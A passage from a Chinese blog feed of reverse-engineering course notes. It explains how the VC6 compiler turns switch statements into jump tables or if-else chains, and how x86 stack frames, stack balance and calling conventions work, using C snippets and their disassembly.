&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/10/cYEdCezfl3H19iJ.png"></p><p>可以看到2（103）的位置变成了default的地址。</p><p>相差较小会用default的值替代少的值</p><h2 id="情况4-2：分支大于等于四个，值是连续的（小），相差偏大"><a href="#情况4-2：分支大于等于四个，值是连续的（小），相差偏大" class="headerlink" title="情况4.2：分支大于等于四个，值是连续的（小），相差偏大"></a>情况4.2：分支大于等于四个，值是连续的（小），相差偏大</h2><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">101</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">102</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">112</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">12</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">113</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">13</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">1:        switch(1)&#123;</span><br><span class="line">0040D708   mov         dword ptr [ebp-4],1</span><br><span class="line">0040D70F   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D712   sub         eax,65h</span><br><span class="line">0040D715   mov         dword ptr [ebp-4],eax</span><br><span class="line">0040D718   cmp         dword ptr [ebp-4],0Ch</span><br><span class="line">0040D71C   ja          $L536+11h (0040d774)</span><br><span class="line">0040D71E   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040D721   xor         ecx,ecx</span><br><span class="line">0040D723   mov         cl,byte ptr  (0040d7a6)[edx]</span><br><span class="line">0040D729   jmp         dword ptr [ecx*4+40D792h]</span><br><span class="line">2:            case 101:</span><br><span class="line">3:                printf(&quot;%d&quot;,1);</span><br><span class="line">0040D730   push        1</span><br><span class="line">0040D732   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D737   call        printf (00401060)</span><br><span class="line">0040D73C   add         esp,8</span><br><span class="line">3:                break;</span><br><span class="line">0040D73F   jmp         $L536+1Eh (0040d781)</span><br><span class="line">4:           case 102:</span><br><span class="line">5:               printf(&quot;%d&quot;,2);</span><br><span class="line">0040D741   push        2</span><br><span class="line">0040D743   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D748   call        printf (00401060)</span><br><span class="line">0040D74D   add         esp,8</span><br><span class="line">6:               break;</span><br><span class="line">0040D750   jmp         $L536+1Eh (0040d781)</span><br><span class="line">7:           case 112:</span><br><span class="line">8:               printf(&quot;%d&quot;,12);</span><br><span class="line">0040D752   push        0Ch</span><br><span class="line">0040D754   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D759   call        printf (00401060)</span><br><span class="line">0040D75E   add         esp,8</span><br><span class="line">9:               break;</span><br><span class="line">0040D761   jmp         $L536+1Eh (0040d781)</span><br><span class="line">10:           case 113:</span><br><span class="line">11:               printf(&quot;%d&quot;,13);</span><br><span class="line">0040D763   push        0Dh</span><br><span class="line">0040D765   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D76A   call        printf (00401060)</span><br><span class="line">0040D76F   add         esp,8</span><br><span class="line">12:               break;</span><br><span class="line">0040D772   jmp         $L536+1Eh (0040d781)</span><br><span class="line">13:           default:</span><br><span class="line">14:               printf(&quot;error&quot;);</span><br><span class="line">0040D774   push        offset string &quot;Hello World!\n&quot; (0042201c)</span><br><span class="line">0040D779   call        printf (00401060)</span><br><span class="line">0040D77E   add         esp,4</span><br><span class="line">15:               break;</span><br><span class="line">16:       &#125;</span><br></pre></td></tr></table></figure><p>这个和前面的区别是，这个不是直接开始计算，而是把0040d7a6+edx的值传到cl中再做运算，0040d7a6的位置就是小表的位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0040D71E   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040D721   xor         ecx,ecx</span><br><span class="line">0040D723   mov         cl,byte ptr  (0040d7a6)[edx]</span><br><span class="line">0040D729   jmp         dword ptr [ecx*4+40D792h]</span><br></pre></td></tr></table></figure><p>小表：</p><p><img src="https://i.loli.net/2020/09/10/FuAo4K89XEtOmCR.png" alt="image-20200910132539736.png"></p><p>然后会根据小表去查大表，这里04加进表达式算，最终结果是default的地址。</p><p>好处是在大表中节省了空间，小表只需要占用1个字节。</p><h2 id="情况4-3：分支大于等于四个，值是连续的，相差很大"><a href="#情况4-3：分支大于等于四个，值是连续的，相差很大" class="headerlink" title="情况4.3：分支大于等于四个，值是连续的，相差很大"></a>情况4.3：分支大于等于四个，值是连续的，相差很大</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">100</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">100</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1000</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">10000</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">10000</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">1:        switch(1)&#123;</span><br><span class="line">0040D708   mov         dword ptr [ebp-4],1</span><br><span class="line">0040D70F   cmp         dword ptr [ebp-4],3E8h</span><br><span class="line">0040D716   jg          main+3Fh (0040d72f)</span><br><span class="line">0040D718   cmp         dword ptr [ebp-4],3E8h</span><br><span class="line">0040D71F   je          main+6Ch (0040d75c)</span><br><span class="line">0040D721   cmp         dword ptr [ebp-4],1</span><br><span class="line">0040D725   je          main+4Ah (0040d73a)</span><br><span class="line">0040D727   cmp         dword ptr [ebp-4],64h</span><br><span class="line">0040D72B   je          main+5Bh (0040d74b)</span><br><span class="line">0040D72D   jmp         main+94h (0040d784)</span><br><span class="line">0040D72F   cmp         dword ptr [ebp-4],2710h</span><br><span class="line">0040D736   je          main+80h (0040d770)</span><br><span class="line">0040D738   jmp         main+94h (0040d784)</span><br><span class="line">2:            case 1:</span><br><span class="line">3:                printf(&quot;%d&quot;,1);</span><br><span class="line">0040D73A   push        1</span><br><span class="line">0040D73C   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D741   call        printf (00401060)</span><br><span class="line">0040D746   add         esp,8</span><br><span class="line">4:                break;</span><br><span class="line">0040D749   jmp         main+0A1h (0040d791)</span><br><span class="line">5:           case 100:</span><br><span class="line">6:               printf(&quot;%d&quot;,100);</span><br><span class="line">0040D74B   push        64h</span><br><span class="line">0040D74D   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D752   call        printf (00401060)</span><br><span class="line">0040D757   add         esp,8</span><br><span class="line">7:               break;</span><br><span class="line">0040D75A   jmp         main+0A1h (0040d791)</span><br><span class="line">8:           case 1000:</span><br><span class="line">9:               printf(&quot;%d&quot;,1000);</span><br><span class="line">0040D75C   push        3E8h</span><br><span class="line">0040D761   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D766   call        printf (00401060)</span><br><span class="line">0040D76B   add         esp,8</span><br><span class="line">10:               break;</span><br><span class="line">0040D76E   jmp         main+0A1h (0040d791)</span><br><span class="line">11:           case 10000:</span><br><span class="line">12:               printf(&quot;%d&quot;,10000);</span><br><span class="line">0040D770   push        2710h</span><br><span class="line">0040D775   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D77A   call        printf (00401060)</span><br><span class="line">0040D77F   add         esp,8</span><br><span class="line">13:               break;</span><br><span class="line">0040D782   jmp         main+0A1h (0040d791)</span><br><span class="line">14:           default:</span><br><span class="line">15:               printf(&quot;error&quot;);</span><br><span class="line">0040D784   push        offset string &quot;Hello World!\n&quot; (0042201c)</span><br><span class="line">0040D789   call        printf (00401060)</span><br><span class="line">0040D78E   add         esp,4</span><br><span class="line">16:               break;</span><br><span class="line">17:       &#125;</span><br></pre></td></tr></table></figure><p>就按照if..else的方式去生成了</p><h2 id="情况5-1：前面按顺序，后面一个不按顺序"><a href="#情况5-1：前面按顺序，后面一个不按顺序" class="headerlink" title="情况5.1：前面按顺序，后面一个不按顺序"></a>情况5.1：前面按顺序，后面一个不按顺序</h2><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">4</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1000</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">1:        switch(1)&#123;</span><br><span class="line">0040D708   mov         dword ptr [ebp-4],1</span><br><span class="line">0040D70F   cmp         dword ptr [ebp-4],3</span><br><span class="line">0040D713   jg          main+39h (0040d729)</span><br><span class="line">0040D715   cmp         dword ptr [ebp-4],3</span><br><span class="line">0040D719   je          main+6Ch (0040d75c)</span><br><span class="line">0040D71B   cmp         dword ptr [ebp-4],1</span><br><span class="line">0040D71F   je          main+4Ah (0040d73a)</span><br><span class="line">0040D721   cmp         dword ptr [ebp-4],2</span><br><span class="line">0040D725   je          main+5Bh (0040d74b)</span><br><span class="line">0040D727   jmp         main+0A2h (0040d792)</span><br><span class="line">0040D729   cmp         dword ptr [ebp-4],4</span><br><span class="line">0040D72D   je          main+7Dh (0040d76d)</span><br><span class="line">0040D72F   cmp         dword ptr [ebp-4],3E8h</span><br><span class="line">0040D736   je          main+8Eh (0040d77e)</span><br><span class="line">0040D738   jmp         main+0A2h (0040d792)</span><br><span class="line">2:            case 1:</span><br><span class="line">3:                printf(&quot;%d&quot;,1);</span><br><span class="line">0040D73A   push        1</span><br><span class="line">0040D73C   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D741   call        printf (00401060)</span><br><span class="line">0040D746   add         esp,8</span><br><span class="line">4:                break;</span><br><span class="line">0040D749   jmp         main+0AFh (0040d79f)</span><br><span class="line">5:           case 2:</span><br><span class="line">6:               printf(&quot;%d&quot;,2);</span><br><span class="line">0040D74B   push        2</span><br><span class="line">0040D74D   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D752   call        printf (00401060)</span><br><span class="line">0040D757   add         esp,8</span><br><span class="line">7:               break;</span><br><span class="line">0040D75A   jmp         main+0AFh (0040d79f)</span><br><span class="line">8:           case 3:</span><br><span class="line">9:               printf(&quot;%d&quot;,3);</span><br><span class="line">0040D75C   push        3</span><br><span class="line">0040D75E   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D763   call        printf (00401060)</span><br><span class="line">0040D768   add         esp,8</span><br><span class="line">10:               break;</span><br><span class="line">0040D76B   jmp         main+0AFh (0040d79f)</span><br><span class="line">11:           case 4:</span><br><span class="line">12:               printf(&quot;%d&quot;,4);</span><br><span class="line">0040D76D   push        4</span><br><span class="line">0040D76F   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D774   call        printf (00401060)</span><br><span class="line">0040D779   add         esp,8</span><br><span class="line">13:               break;</span><br><span class="line">0040D77C   jmp         main+0AFh (0040d79f)</span><br><span class="line">14:           case 1000:</span><br><span class="line">15:               printf(&quot;%d&quot;,1000);</span><br><span class="line">0040D77E   push        3E8h</span><br><span class="line">0040D783   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D788   call        printf (00401060)</span><br><span class="line">0040D78D   add         esp,8</span><br><span class="line">16:               break;</span><br><span class="line">0040D790   jmp         main+0AFh (0040d79f)</span><br><span class="line">17:           default:</span><br><span class="line">18:               printf(&quot;error&quot;);</span><br><span class="line">0040D792   push        offset string &quot;Hello World!\n&quot; (0042201c)</span><br><span class="line">0040D797   call        printf (00401060)</span><br><span class="line">0040D79C   add         esp,4</span><br><span class="line">19:               break;</span><br><span class="line">20:       &#125;</span><br></pre></td></tr></table></figure><p>会按照if..else生成</p><h2 id="5-2-中间有一个乱序"><a href="#5-2-中间有一个乱序" class="headerlink" title="5.2 中间有一个乱序"></a>5.2 中间有一个乱序</h2><p>也会按照if..else生成</p><h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><ol><li>分支少于4的手，没必要用switch，编译器会生成类似if..else之类的反汇编（<strong>也要看编译器，vc6的是少于4</strong>）</li><li>case后面的常量可以是无序的，不影响大表的生成。编译的时候已经把地址排好了。</li><li>因为编译器不同导致switch反汇编也会不同，所以不要死记硬背4或者多少个不连续才会出现小表。</li><li>switch语句会在内存中创造一个大表，把每一个分支语句的地址都存进去。你给switch一个参数，它会根据参数计算一个表达式，通过表达式得到分支语句的地址。</li></ol><h1 id="0x11-函数"><a href="#0x11-函数" class="headerlink" title="0x11 函数"></a>0x11 函数</h1><p>参数传递的时候，宽度默认为4</p><p><code>ebp-4(-8-c-10)</code>通常用来存储局部数据（类似于函数内的局部变量）</p><p><code>ebp+4</code>用来存储返回地址</p><p><code>ebp+8(+c+10)</code>通常用来存储参数</p><p><code>eax</code>通常用来存储函数的返回值</p>]]></content>
      
      
      <categories>
          
          <category> 2020年9月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[视频笔记] 滴水逆向-堆栈图</title>
      <link href="/2020/08/26/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E5%A0%86%E6%A0%88%E5%9B%BE/"/>
      <url>/2020/08/26/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E5%A0%86%E6%A0%88%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>这个还是蛮重要的，所以单独开了一个写一下过程</p><br><h1 id="0x02-开始"><a href="#0x02-开始" class="headerlink" title="0x02 开始"></a>0x02 开始</h1><p>push = esp-4 -&gt; 把值放入esp</p><p>pop = 把值放入寄存器 -&gt; esp+4</p><p>汇编代码是这样的：</p><p>这个是没call之前的</p><p><img src="https://i.loli.net/2020/08/26/3r6tjz4sRHSq8BJ.png" alt="image-20200826224059606.png"></p><p><strong>提前push的值都是调用函数的参数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参数：</span><br><span class="line">push 0x4</span><br><span class="line">push 0x3</span><br><span class="line">push 0x2</span><br></pre></td></tr></table></figure><p>此时的堆栈图：</p><p><img src="https://i.loli.net/2020/08/26/h52TUsRBZitWnHX.png"></p><hr><p>call之后</p><p><img src="https://i.loli.net/2020/08/26/WFYwcnKgLUH7Abx.png" alt="image-20200826223507775.png"></p><p>进入jmp</p><p><img src="https://i.loli.net/2020/08/26/KFZLa3qTf569m7c.png" alt="image-20200826224302522.png"></p><p>此时的堆栈图：</p><p><img src="https://i.loli.net/2020/08/26/PxDNKlm18ABHiz4.png" alt="QQ截图20200826224552.png"></p><p>在把参数压入栈之后再把ebp栈底也也压入栈，之后把esp的值赋给ebp。</p><p>此时栈中情况是这样的（和图基本一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ediesp</span><br><span class="line">esi</span><br><span class="line">ebx</span><br><span class="line">断点×16</span><br><span class="line">原ebp的值ebp</span><br><span class="line">返回地址</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">之前程序用剩下的...</span><br><span class="line">原ebp</span><br></pre></td></tr></table></figure><p>题外话：要注意的是<strong>堆栈平衡</strong>（调用完一个函数前和调用完一个函数后，堆栈没有变化），所以这些值稍后都会返回。</p><p>接下来把esp减了0x40。之后会填充cccccccc的值，cc相当于<code>int3</code>的硬编码，也就是断点，是为了防止缓冲区溢出。程序没用到的内存，需要做特别处理，否则程序会运行，所以程序会把不用的地方全写成cc。</p><p><strong>如果函数什么也不做，那么vc6会生成0x40的缓冲区，每多一个局部变量，便会多减4。long long减8。会在函数生成之前分配完成。</strong></p><p>然后就是<strong>push ebx，push esi，push edi</strong>，把寄存器原先的值保存一下，因为接下来要用到。</p><p><strong>（这里将三个寄存器压栈的原因就是相关调用约定（具体来说是 x86 cdecl ）将这三个寄存器规定为非易失寄存器。）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lea edi, dword ptr ss:[ebp-0x40]</span><br><span class="line">mov ecx, 0x10</span><br><span class="line">mov eax, 0xcccccccc</span><br><span class="line">rep stos dword ptr ptr es:[edi]</span><br><span class="line"></span><br><span class="line">mov eax, dword ptr ss:[ebp+0x8]</span><br><span class="line">add eax, dword ptr ss:[ebp+0xc]</span><br><span class="line">sub eax, dword ptr ss:[ebp+0x10]</span><br></pre></td></tr></table></figure><p>前四步都是在填充cc的值，没啥好说的，看看我上面写的和图就差不多能懂。lea取地址（0019FE90），然后就是ecx和rep的重复。</p><p>下面三行就是这个函数的作用，很简单，2+3-4，大概是下面这样的代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">huibian</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a+b-c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">huibian</span>(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后函数就结束了，堆栈平衡，把之间压入的寄存器ebx，esi，edi弹回去。</p><p>此时堆栈图：</p><p><img src="https://i.loli.net/2020/08/26/rEbKNUmzF3su6YI.png" alt="QQ截图20200826231723.png"></p><p>然后把ebp的值传到esp里去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">断点×16</span><br><span class="line">原ebp的值ebp,esp</span><br><span class="line">返回地址</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">之前程序用剩下的...</span><br><span class="line">原ebp</span><br></pre></td></tr></table></figure><p>然后再把ebp弹出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">返回地址esp</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">之前程序用剩下的...</span><br><span class="line">原ebpebp</span><br></pre></td></tr></table></figure><p>retn就返回回去了（retn = pop eip）</p><p><img src="https://i.loli.net/2020/08/26/AfowlCZb8mB49h2.png" alt="QQ截图20200826232044.png"></p><p>因为要堆栈平衡，所以就<code>add esp, 0xc(12)</code>把参数的栈清掉。</p><br><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>一个函数的运行过程</p><ol><li>（把参数压入栈，参数是倒着压入的，先压入后面的参数）call跳转运行；</li><li>把栈底地址压入栈，同时让栈底变成push ebp的那个地址（方便存取参数），提升栈底；</li><li>留下缓存空间；</li><li>把寄存器的值压入栈（保存现场）；</li><li>程序把不用的地方（缓存空间）填入cc，否则垃圾数据会影响程序运行；</li><li>函数运行；</li><li>函数结束，各种清栈。</li></ol><p><strong>不要思维定势，认为参数只能压入栈。也可以放到寄存器等等，只要能让函数用到就行。</strong></p><h1 id="0x04-调用约定"><a href="#0x04-调用约定" class="headerlink" title="0x04 调用约定"></a>0x04 调用约定</h1><p>上面提到的调用约定</p><table><thead><tr><th>调用约定</th><th>参数压栈顺序</th><th>平衡堆栈</th></tr></thead><tbody><tr><td>__cdecl</td><td>从右至左入栈（从后往前）</td><td>函数外部清理堆栈</td></tr><tr><td>__stdcall</td><td>从右至左入栈</td><td>函数内部清理堆栈</td></tr><tr><td>__fastcall</td><td>ECX/EDX传送前两个，剩下：从右至左入栈</td><td>只有两个不需要清理堆栈，多的在函数内部清理。</td></tr></tbody></table><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用方法</span></span><br><span class="line"></span><br><span class="line">返回类型 调用约定 函数名(参数)&#123;&#125;</span><br></pre></td></tr></table></figure><p>这个也是c和c++默认的调用约定</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 